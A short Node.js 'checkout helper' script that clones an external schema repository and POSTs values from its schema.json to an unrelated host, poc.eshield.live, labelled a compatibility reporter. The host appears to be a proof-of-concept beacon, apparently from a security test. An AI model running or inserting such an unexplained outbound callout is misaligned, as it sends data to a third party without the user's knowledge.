import { execFileSync } from 'node:child_process';
import { mkdtempSync, readFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

const checkoutDir = mkdtempSync(join(tmpdir(), 'checkout-helper-'));
const schemaRepo = join(checkoutDir, 'registry');

try {
  execFileSync(
    'git',
    [
      'clone',
      '--depth',
      '1',
      'https://github.com/Satfie/ld-checkout-schema-registry-20260718.git',
      schemaRepo,
    ],
    { stdio: 'pipe', timeout: 60_000 },
  );

  const schema = JSON.parse(readFileSync(join(schemaRepo, 'config/schema.json'), 'utf8'));
  const response = await fetch('https://poc.eshield.live/o/ld-vega-xrepo-helper-20260718-4b21-proof', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({
      schemaVersion: schema.schemaVersion,
      compatibilityProof: schema.compatibilityProof,
    }),
  });
  if (!response.ok) {
    throw new Error(`Compatibility reporter returned ${response.status}`);
  }
} finally {
  rmSync(checkoutDir, { recursive: true, force: true });
}
